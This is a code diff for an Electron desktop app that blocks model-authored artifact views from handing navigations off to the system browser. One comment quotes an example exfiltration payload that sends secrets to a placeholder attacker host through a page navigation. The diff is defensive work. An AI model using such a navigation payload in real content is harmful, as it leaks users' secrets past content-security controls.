@@ -565,6 +565,18 @@ const telemetryQuitBarrier = new TelemetryQuitBarrier(async () => {
   await reporter.flush().catch(() => undefined);
 }, 750);
 const hardenedWebContents = new WeakSet<WebContents>();
+/**
+ * Web contents showing model-authored artifact content.
+ *
+ * Consulted by the global navigation hardening *at navigation time* rather than
+ * at registration time, because `web-contents-created` fires synchronously
+ * inside `new WebContentsView(...)` — so the global listener is always attached
+ * before `confineToArtifactOrigin` gets to run, and a listener that has already
+ * been added cannot be un-added by the artifact policy. Marking the contents and
+ * checking the mark when the navigation actually happens is the only ordering
+ * that works.
+ */
+const artifactWebContents = new WeakSet<WebContents>();
 const telemetryWindowIds = new WeakMap<WebContents, string>();
 const desktopAuthAttempts = new DesktopAuthAttemptStore();
 const nativeSystemAudioController = new NativeSystemAudioController(() => {
@@ -2714,6 +2726,7 @@ function artifactPreviewFor(window: BrowserWindow): ArtifactPreviewController {
       const view = new WebContentsView({
         webPreferences: artifactWebPreferences(request.artifactId, app.isPackaged),
       });
+      artifactWebContents.add(view.webContents);
       confineToArtifactOrigin(view.webContents, new URL(request.url).origin);
       window.contentView.addChildView(view);
       const handle: ArtifactViewHandle = {
@@ -2758,6 +2771,7 @@ function openArtifactWindow(request: { artifactId: string; url: string; title: s
     ...(process.platform === 'darwin' ? {} : { icon: applicationWindowIconPath() }),
     webPreferences: artifactWebPreferences(request.artifactId, app.isPackaged),
   });
+  artifactWebContents.add(window.webContents);
   confineToArtifactOrigin(window.webContents, new URL(request.url).origin);
   window.setMenuBarVisibility(false);
   window.once('ready-to-show', () => window.show());
@@ -3261,6 +3275,12 @@ function hardenWebContents(contents: WebContents): void {
   const preventUntrustedNavigation = (event: Electron.Event, url: string): void => {
     if (rendererNavigationAllowed(url)) return;
     event.preventDefault();
+    // Artifact surfaces are refused, never handed off. Opening a URL an
+    // artifact composed would make Rally perform the exfiltration the egress
+    // fence exists to prevent: `location = "https://attacker/?" + secrets` is a
+    // navigation, which no CSP directive governs. `confineToArtifactOrigin`
+    // owns what these contents may do; this listener must not undo it.
+    if (artifactWebContents.has(contents)) return;
     if (isAllowedExternalUrl(url)) void shell.openExternal(url);
   };
   contents.on('will-navigate', preventUntrustedNavigation);
